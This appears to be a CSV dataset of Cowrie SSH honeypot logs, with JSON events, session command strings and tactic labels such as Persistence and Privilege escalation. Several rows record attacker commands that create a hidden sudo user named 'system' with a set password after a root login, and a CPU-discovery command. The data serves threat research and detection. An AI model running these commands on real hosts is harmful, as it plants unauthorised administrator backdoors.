,event,session_id,session,labels
18,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/22d7b45ef76e027d654fbea8146015d614d0b0e6f30c67d8adad680ff9414b5e after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""22d7b45ef76e027d654fbea8146015d614d0b0e6f30c67d8adad680ff9414b5e"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T07:28:53.152476Z"", ""ttylog"": ""var/lib/cowrie/tty/22d7b45ef76e027d654fbea8146015d614d0b0e6f30c67d8adad680ff9414b5e"", ""session_id"": ""0805590cefbc""}",0805590cefbc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 eBDaWCQN) system  && sudo usermod -aG sudo system ; openssl passwd -1 eBDaWCQN;,"['Initial access', 'Persistence', 'Privilege escalation']"
19,"{""duration"": ""0.9"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.9 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T07:28:53.153028Z"", ""session_id"": ""0805590cefbc""}",0805590cefbc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 eBDaWCQN) system  && sudo usermod -aG sudo system ; openssl passwd -1 eBDaWCQN;,"['Initial access', 'Persistence', 'Privilege escalation']"
20,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:33313 (10.42.6.15:2222) [session: bf1a007a2dcf]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 33313.0, ""timestamp"": ""2025-08-10T18:39:56.270540Z"", ""session_id"": ""bf1a007a2dcf""}",bf1a007a2dcf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 agSqFqND) system  && sudo usermod -aG sudo system ; openssl passwd -1 agSqFqND;,"['Initial access', 'Persistence', 'Privilege escalation']"
21,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T18:39:56.271881Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""bf1a007a2dcf""}",bf1a007a2dcf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 agSqFqND) system  && sudo usermod -aG sudo system ; openssl passwd -1 agSqFqND;,"['Initial access', 'Persistence', 'Privilege escalation']"
22,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T18:39:56.291278Z"", ""session_id"": ""bf1a007a2dcf""}",bf1a007a2dcf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 agSqFqND) system  && sudo usermod -aG sudo system ; openssl passwd -1 agSqFqND;,"['Initial access', 'Persistence', 'Privilege escalation']"
23,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T18:39:56.355081Z"", ""username"": ""root"", ""session_id"": ""bf1a007a2dcf""}",bf1a007a2dcf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 agSqFqND) system  && sudo usermod -aG sudo system ; openssl passwd -1 agSqFqND;,"['Initial access', 'Persistence', 'Privilege escalation']"
24,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T18:39:56.444823Z"", ""session_id"": ""bf1a007a2dcf""}",bf1a007a2dcf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 agSqFqND) system  && sudo usermod -aG sudo system ; openssl passwd -1 agSqFqND;,"['Initial access', 'Persistence', 'Privilege escalation']"
25,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 agSqFqND) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 agSqFqND) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T18:39:56.445546Z"", ""session_id"": ""bf1a007a2dcf""}",bf1a007a2dcf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 agSqFqND) system  && sudo usermod -aG sudo system ; openssl passwd -1 agSqFqND;,"['Initial access', 'Persistence', 'Privilege escalation']"
26,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 agSqFqND"", ""message"": ""CMD: openssl passwd -1 agSqFqND"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T18:39:56.446196Z"", ""session_id"": ""bf1a007a2dcf""}",bf1a007a2dcf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 agSqFqND) system  && sudo usermod -aG sudo system ; openssl passwd -1 agSqFqND;,"['Initial access', 'Persistence', 'Privilege escalation']"
27,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 agSqFqND"", ""message"": ""Command not found: openssl passwd -1 agSqFqND"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T18:39:56.491719Z"", ""session_id"": ""bf1a007a2dcf""}",bf1a007a2dcf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 agSqFqND) system  && sudo usermod -aG sudo system ; openssl passwd -1 agSqFqND;,"['Initial access', 'Persistence', 'Privilege escalation']"
28,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/0a5d421b741a6380cb4f6f58a52ff1a16d562a78f6213f0dabffd3e1c21e1cc7 after 0.1 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""0a5d421b741a6380cb4f6f58a52ff1a16d562a78f6213f0dabffd3e1c21e1cc7"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T18:39:56.515804Z"", ""ttylog"": ""var/lib/cowrie/tty/0a5d421b741a6380cb4f6f58a52ff1a16d562a78f6213f0dabffd3e1c21e1cc7"", ""session_id"": ""bf1a007a2dcf""}",bf1a007a2dcf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 agSqFqND) system  && sudo usermod -aG sudo system ; openssl passwd -1 agSqFqND;,"['Initial access', 'Persistence', 'Privilege escalation']"
29,"{""duration"": ""0.2"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.2 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T18:39:56.518090Z"", ""session_id"": ""bf1a007a2dcf""}",bf1a007a2dcf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 agSqFqND) system  && sudo usermod -aG sudo system ; openssl passwd -1 agSqFqND;,"['Initial access', 'Persistence', 'Privilege escalation']"
30,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:47579 (10.42.4.33:2222) [session: d71014776411]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 47579.0, ""timestamp"": ""2025-08-05T00:22:47.612171Z"", ""session_id"": ""d71014776411""}",d71014776411,grep -c ^processor /proc/cpuinfo;,"['Initial access', 'Discovery']"
31,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-libssh2_1.9.0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T00:22:47.612576Z"", ""version"": ""SSH-2.0-libssh2_1.9.0"", ""session_id"": ""d71014776411""}",d71014776411,grep -c ^processor /proc/cpuinfo;,"['Initial access', 'Discovery']"
32,"{""compCS"": [""none""], ""encCS"": [""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr"", ""aes256-cbc"", ""rijndael-cbc@lysator.liu.se"", ""aes192-cbc"", ""aes128-cbc"", ""blowfish-cbc"", ""arcfour128"", ""arcfour"", ""cast128-cbc"", ""3des-cbc""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""1616c6d18e845e7a01168a44591f7a35"", ""hashAlgorithms"": ""ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none"", ""kexAlgs"": [""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group-exchange-sha256"", ""diffie-hellman-group-exchange-sha1"", ""diffie-hellman-group14-sha1"", ""diffie-hellman-group1-sha1""], ""keyAlgs"": [""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""ssh-rsa"", ""ssh-dss""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256"", ""hmac-sha2-512"", ""hmac-sha1"", ""hmac-sha1-96"", ""hmac-md5"", ""hmac-md5-96"", ""hmac-ripemd160"", ""hmac-ripemd160@openssh.com""], ""message"": ""SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T00:22:47.813155Z"", ""session_id"": ""d71014776411""}",d71014776411,grep -c ^processor /proc/cpuinfo;,"['Initial access', 'Discovery']"
